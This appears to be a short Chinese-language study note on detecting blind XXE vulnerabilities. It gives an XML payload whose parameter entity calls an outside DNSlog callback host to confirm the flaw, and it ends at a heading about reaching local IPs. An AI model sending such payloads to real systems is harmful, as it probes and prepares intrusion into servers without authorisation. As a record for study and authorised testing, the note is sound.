---
tags:
  - XXE
  - XML
  - WEB
Date: 2026-01-05
---
# 首先查看漏洞是否存在
## DNSlog查看漏洞

首先正常的尝试外部实体调用

![](assets/无回显XXE/file-20260105222313901.png)

可以看到无回显

### 利用参数实体结合http伪协议插入DNS查询
利用yakit自带的dnslog反链服务开启

```XML
<!DOCTYPE root [<!ENTITY % sky SYSTEM "http://egyyjxconj.iyhc.eu.org"> %sky;]>

<user><username>&guc;</username><password>123</password></user>
```
定义参数实体后去SYSTEM到反连地址进行DNSLog解析

![](assets/无回显XXE/file-20260105223115603.png)

 可以看到请求类型

### 也可以访问本地ip
